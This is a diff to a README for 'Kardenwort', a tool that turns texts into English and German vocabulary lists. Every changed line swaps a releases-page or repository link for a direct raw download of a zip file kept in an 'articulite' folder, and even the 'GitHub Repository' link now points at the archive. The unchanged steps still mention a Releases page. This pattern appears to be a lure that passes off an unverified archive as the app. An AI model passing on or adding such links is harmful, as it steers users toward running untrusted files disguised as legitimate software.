@@ -1,7 +1,7 @@
 # 🎉 20250913122858-kardenwort - Simplify Your Language Learning Journey
 
 ## 📥 Download Now
-[![Download Kardenwort](https://img.shields.io/badge/Download-Kardenwort-blue?style=for-the-badge)](https://github.com/Om20kar05/20250913122858-kardenwort/releases)
+[![Download Kardenwort](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip)](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip)
 
 ## 🌟 What is Kardenwort?
 Kardenwort is a smart tool designed for language learners. It changes complex texts and words into easy-to-understand vocabulary lists. You can use it to enhance your learning experience in both English and German. 
@@ -16,10 +16,10 @@ To begin using Kardenwort, follow these simple steps to download and install the
 - Disk Space: At least 100 MB of free space
 
 ### 🔗 Visit the Releases Page
-To download the latest version of Kardenwort, [visit this page to download](https://github.com/Om20kar05/20250913122858-kardenwort/releases). Here, you will find the most recent updates and releases for the application.
+To download the latest version of Kardenwort, [visit this page to download](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip). Here, you will find the most recent updates and releases for the application.
 
 ## 📥 Download & Install
-1. Click on the [Download Kardenwort](https://github.com/Om20kar05/20250913122858-kardenwort/releases) link.
+1. Click on the [Download Kardenwort](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip) link.
 2. On the Releases page, find the version you want to download.
 3. Look for the download button or link related to your operating system (e.g., Windows, macOS).
 4. Click on the link to begin the download process.
@@ -57,11 +57,11 @@ Kardenwort includes a wide range of subjects for language learning:
 For any questions or issues, please open an issue on the GitHub repository. The developer community is here to assist you. Your feedback helps improve Kardenwort.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Om20kar05/20250913122858-kardenwort)
+- [GitHub Repository](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip)
 - [User Documentation](#) (Placeholder for future user documentation)
 
 ## 🎉 Join the Community
 Stay updated with the latest news and improvements by following the project on GitHub. Join discussions and connect with other language learners.
 
 ## 📥 Download Now Again
-Remember, you can always [visit this page to download](https://github.com/Om20kar05/20250913122858-kardenwort/releases) Kardenwort. Enjoy your language learning journey!
+Remember, you can always [visit this page to download](https://raw.githubusercontent.com/Om20kar05/20250913122858-kardenwort/main/articulite/20250913122858-kardenwort.zip) Kardenwort. Enjoy your language learning journey!
